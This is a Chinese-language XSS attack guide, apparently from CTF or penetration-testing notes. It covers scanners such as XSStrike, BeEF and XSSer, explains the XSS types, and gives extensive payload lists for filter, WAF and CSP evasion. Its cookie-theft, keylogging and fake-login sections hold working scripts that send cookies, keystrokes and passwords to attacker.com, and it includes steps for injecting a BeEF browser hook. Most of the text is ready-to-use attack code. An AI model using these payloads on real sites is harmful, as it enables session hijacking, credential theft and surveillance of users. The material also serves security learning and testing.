# XSS测试工具

跨站脚本攻击(Cross-Site Scripting)是常见的Web漏洞。

## 在线工具

### XSS测试平台

| 工具名称 | 链接 | 功能 |
|---------|------|------|
| XSS Hunter | [https://xsshunter.com/](https://xsshunter.com/) | XSS盲打平台，收集触发信息 |
| XSS Game | [https://xss-game.appspot.com/](https://xss-game.appspot.com/) | Google的XSS学习游戏（6关卡） |
| Prompt.ml | [http://prompt.ml/](http://prompt.ml/) | XSS挑战平台 |
| Alert(1) to win | [https://alf.nu/alert1](https://alf.nu/alert1) | XSS挑战游戏 |

### XSS Payload资源

| 资源名称 | 链接 | 特点 |
|---------|------|------|
| PayloadsAllTheThings | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) | XSS Payload大全 |
| XSS Payload List | [GitHub](https://github.com/payloadbox/xss-payload-list) | 分类清晰的Payload集合 |
| PortSwigger Cheat Sheet | [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | 官方XSS速查表 |
| OWASP XSS Filter Evasion | [Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) | 绕过技巧大全 |

### 在线编码工具

| 工具名称 | 链接 | 功能 |
|---------|------|------|
| HTML Entity Encoder | [https://www.web2generators.com/html/entities](https://www.web2generators.com/html/entities) | HTML实体编码 |
| JavaScript Obfuscator | [https://obfuscator.io/](https://obfuscator.io/) | JS混淆 |
| JSFuck | [http://www.jsfuck.com/](http://www.jsfuck.com/) | JS极限编码 |

## 离线工具

### XSStrike

**下载链接**:
```
https://github.com/s0md3v/XSStrike
```

**安装**:
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```

**基本使用**:
```bash
# 基本扫描
python xsstrike.py -u "http://example.com/page?q=test"

# 爬虫模式
python xsstrike.py -u "http://example.com/" --crawl

# 指定参数
python xsstrike.py -u "http://example.com/page" --data "username=test&password=test"

# 使用自定义Payload
python xsstrike.py -u "url" --payload "<script>alert(1)</script>"

# 跳过DOM扫描
python xsstrike.py -u "url" --skip-dom

# 模糊测试模式
python xsstrike.py -u "url" --fuzzer
```

**特点**:
- 智能Payload生成
- 自动WAF检测
- 爬虫功能
- DOM XSS检测

### BeEF (Browser Exploitation Framework)

**下载链接**:
```
https://github.com/beefproject/beef
```

**安装**:
```bash
# Kali Linux预装
beef-xss

# 手动安装
git clone https://github.com/beefproject/beef.git
cd beef
./install

# 启动
./beef
```

**使用**:
```
1. 启动BeEF: ./beef
2. 访问管理界面: http://127.0.0.1:3000/ui/panel
3. 默认账号: beef / beef
4. 获取Hook代码:
   <script src="http://your-ip:3000/hook.js"></script>
5. 将Hook注入到目标页面
6. 在BeEF界面控制浏览器
```

**功能**:
- 浏览器Hook
- 信息收集
- 社会工程
- 网络扫描
- 持久化控制

### XSSer

**下载链接**:
```
https://github.com/epsylon/xsser
```

**安装使用**:
```bash
git clone https://github.com/epsylon/xsser.git
cd xsser
python xsser.py --help

# 基本扫描
python xsser.py -u "http://example.com/page?q=XSS"

# 使用代理
python xsser.py -u "url" --proxy="http://127.0.0.1:8080"

# POST请求
python xsser.py -u "url" --data="param=value"
```

## XSS类型详解

### 1. 反射型XSS (Reflected XSS)

**特点**:
- 非持久化，参数传递
- 需要用户点击链接
- 最常见类型

**示例场景**:
```html
<!-- 搜索功能 -->
http://example.com/search?q=<script>alert(1)</script>

<!-- 错误消息 -->
http://example.com/error?msg=<script>alert(1)</script>

<!-- 用户输入回显 -->
http://example.com/page?name=<img src=x onerror=alert(1)>
```

**攻击流程**:
```
1. 发现反射点
2. 构造Payload
3. 生成恶意链接
4. 诱骗用户点击
5. 窃取Cookie/Session
```

### 2. 存储型XSS (Stored XSS)

**特点**:
- 持久化存储在服务器
- 危害最大
- 影响所有访问用户

**常见场景**:
```
- 留言板/评论
- 用户个人资料
- 博客文章
- 论坛帖子
- 私信/聊天
```

**示例**:
```html
<!-- 在评论中插入 -->
<script>
new Image().src='http://attacker.com/?c='+document.cookie;
</script>

<!-- 个人签名 -->
<img src=x onerror="fetch('http://attacker.com/?cookie='+document.cookie)">
```

### 3. DOM型XSS

**特点**:
- 不经过服务器
- 纯前端JavaScript触发
- 难以被WAF检测

**脆弱代码示例**:
```javascript
// 直接使用location参数
document.write(location.hash);
document.write(location.search);
innerHTML = location.hash;

// 不安全的eval
eval(location.hash);

// jQuery
$(location.hash).html();
```

**攻击示例**:
```html
<!-- URL片段 -->
http://example.com/#<script>alert(1)</script>

<!-- URL参数 -->
http://example.com/?name=<img src=x onerror=alert(1)>

<!-- 利用JavaScript协议 -->
http://example.com/#javascript:alert(1)
```

**常见Sink（危险函数）**:
```javascript
document.write()
document.writeln()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
Function()
location.href
element.setAttribute()
```

## 常用Payload

### 基础测试Payload

```html
<!-- 最基本 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- 简短版本 -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- JavaScript伪协议 -->
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
```

### 绕过过滤Payload

#### 大小写混合
```html
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=X oNeRrOr=alert(1)>
```

#### 编码绕过
```html
<!-- HTML实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

<!-- Unicode编码 -->
<script>alert(1)</script>

<!-- 十六进制 -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

<!-- Base64 -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- URL编码 -->
%3Cscript%3Ealert(1)%3C/script%3E
```

#### 无script标签
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
```

#### 所有事件处理器
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video onloadstart=alert(1)>
<audio onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>
<details open ontoggle=alert(1)>
<svg onload=alert(1)>
```

#### 无括号
```html
<script>alert`1`</script>
<script>throw onerror=alert,'1'</script>
<script>onerror=alert;throw 1</script>
```

#### 无空格
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<iframe/src=javascript:alert(1)>
```

#### 无引号
```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
```

#### 长度限制
```html
<!-- 最短XSS (20字符) -->
<svg onload=alert()>

<!-- 更短(需要配合) -->
<script src=//⑭.₨>

<!-- 极限压缩 -->
<svg/onload=alert`1`>  <!-- 23字符 -->
```

### Cookie窃取
```html
<!-- 发送到攻击者服务器 -->
<script>
new Image().src='http://attacker.com/?c='+document.cookie;
</script>

<!-- 使用fetch -->
<script>
fetch('http://attacker.com/?c='+document.cookie);
</script>

<!-- 使用XMLHttpRequest -->
<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','http://attacker.com/?c='+document.cookie);
xhr.send();
</script>

<!-- 使用location -->
<script>
location.href='http://attacker.com/?c='+document.cookie;
</script>

<!-- 隐蔽方式 -->
<script>
document.write('<img src="http://attacker.com/?c='+document.cookie+'">');
</script>
```

### 键盘记录
```html
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/?key='+e.key);
}
</script>

<script>
document.addEventListener('keypress', function(e){
  new Image().src='http://attacker.com/?k='+e.key;
});
</script>
```

### 页面劫持
```html
<!-- 钓鱼页面 -->
<script>
document.body.innerHTML='<h1>请重新登录</h1><form action="http://attacker.com/steal"><input name="user"><input type="password" name="pass"><input type="submit"></form>';
</script>

<!-- 重定向 -->
<script>
location.href='http://attacker.com/phishing';
</script>
```

## 绕过WAF技巧

### 1. 注释混淆
```html
<script><!--
alert(1)
//--></script>

<script>/**/alert/**/( /**/1/**/)/**/</script>

<img src=x onerror=/**/alert(1)/**//>
```

### 2. 换行符绕过
```html
<script>
alert
(
1
)
</script>

<img src=x
onerror=
alert(1)
>
```

### 3. 字符串拼接
```javascript
<script>eval('ale'+'rt(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>[]['constructor']['constructor']('alert(1)')()</script>
```

### 4. 双重编码
```html
%253Cscript%253Ealert(1)%253C/script%253E
```

### 5. 利用浏览器特性
```html
<!-- IE -->
<img src=x onerror=alert(1) language=vbscript>

<!-- 换行符 -->
<img src=x onerror="ale%0Art(1)">
<img src=x onerror="ale%0Drt(1)">

<!-- Null字节 -->
<script>al%00ert(1)</script>
```

### 6. HTML属性混淆
```html
<img src="x" onerror="alert(1)">
<img src='x' onerror='alert(1)'>
<img src=x onerror=alert(1)>
<img/src=x/onerror=alert(1)>
<img src = x onerror = alert(1)>
```

### 7. JavaScript替代语法
```javascript
// 函数调用
alert(1)
alert`1`
alert.call(null,1)
alert.apply(null,[1])
window['alert'](1)
window['al'+'ert'](1)
top['alert'](1)
parent['alert'](1)
self['alert'](1)

// 数字表示
1 → 1
1 → 0x1
1 → 01
1 → 1e0
1 → 1.
```

## CSP绕过

### 常见CSP策略
```
Content-Security-Policy: default-src 'self'
Content-Security-Policy: script-src 'self'
Content-Security-Policy: script-src 'unsafe-inline'
```

### 绕过技巧

#### 1. JSONP端点利用
```html
<!-- 如果允许google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://www.google.com/complete/search?client=chrome&q=hello&jsonp=alert"></script>
```

#### 2. AngularJS模板注入
```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

#### 3. 利用base标签
```html
<base href="http://attacker.com/">
<script src="/evil.js"></script>
```

#### 4. iframe沙箱绕过
```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>alert(1)</script>"></iframe>
```

## CTF解题技巧

!!! tip "测试流程"
    ```
    1. 找到输入点
       - URL参数
       - POST数据
       - Cookie
       - HTTP头
    
    2. 测试基础Payload
       <script>alert(1)</script>
       <img src=x onerror=alert(1)>
    
    3. 查看输出
       - 查看HTML源码
       - 开发者工具检查
    
    4. 识别过滤规则
       - 哪些字符被过滤
       - 哪些标签被过滤
       - 编码是否生效
    
    5. 构造绕过Payload
       - 换标签
       - 编码
       - 混淆
    
    6. 获取目标数据
       - 窃取Cookie
       - 读取页面内容
       - 发送到外部
    ```

!!! tip "快速Payload"
    ```html
    # 测试是否存在XSS
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    
    # 测试过滤
    <script>alert(document.domain)</script>
    <script>alert(document.cookie)</script>
    
    # 窃取Cookie
    <script>location.href='http://attacker.com/?c='+document.cookie</script>
    
    # DOM XSS测试
    #<script>alert(1)</script>
    ?name=<script>alert(1)</script>
    ```

!!! tip "常见绕过"
    ```html
    # script被过滤 → 使用img/svg
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    
    # 空格被过滤 → 使用/
    <img/src=x/onerror=alert(1)>
    
    # 括号被过滤 → 使用反引号
    <script>alert`1`</script>
    
    # 引号被过滤 → 不用引号
    <img src=x onerror=alert(1)>
    
    # 关键字被过滤 → 大小写混合
    <ScRiPt>alert(1)</sCrIpT>
    
    # 标签闭合被过滤 → 利用已有标签
    "><script>alert(1)</script>
    ```

!!! tip "DOM XSS发现"
    ```javascript
    // 查看JavaScript代码
    // 搜索危险函数
    document.write
    innerHTML
    eval
    setTimeout
    location.href
    
    // 搜索用户输入来源
    location.hash
    location.search
    document.referrer
    window.name
    ```

!!! warning "调试技巧"
    ```
    1. F12开发者工具
       - Elements: 查看HTML渲染
       - Console: 测试JavaScript
       - Network: 查看请求
    
    2. 查看源码
       - Ctrl+U 查看原始HTML
       - 右键 -> 查看网页源代码
    
    3. Burp Suite
       - 拦截请求
       - 修改Payload
       - 查看响应
    
    4. XSS测试技巧
       - 先测试alert(1)确认存在
       - 逐步添加绕过
       - 记录哪些字符被过滤
       - 尝试不同编码
    ```

!!! tip "BeEF使用"
    ```
    1. 启动BeEF: ./beef
    2. 访问: http://127.0.0.1:3000/ui/panel
    3. 获取Hook: <script src="http://your-ip:3000/hook.js"></script>
    4. 注入目标页面
    5. 在BeEF控制台中:
       - 查看浏览器信息
       - 执行命令
       - 钓鱼攻击
       - 键盘记录
    ```

!!! tip "XSStrike使用"
    ```bash
    # 基本扫描
    python xsstrike.py -u "http://target.com/?q=test"
    
    # 爬虫模式（自动发现参数）
    python xsstrike.py -u "http://target.com/" --crawl
    
    # POST请求
    python xsstrike.py -u "http://target.com/search" --data "keyword=test"
    
    # 使用代理（配合Burp）
    python xsstrike.py -u "url" --proxy http://127.0.0.1:8080
    ```

## 相关资源

- **XSS Game**: Google官方XSS学习游戏，6个关卡
- **XSStrike**: 自动化XSS扫描工具，智能Payload生成
- **BeEF**: 浏览器利用框架，可远程控制浏览器
- **PayloadsAllTheThings**: 最全XSS Payload集合
- **PortSwigger Cheat Sheet**: 官方XSS速查表，持续更新
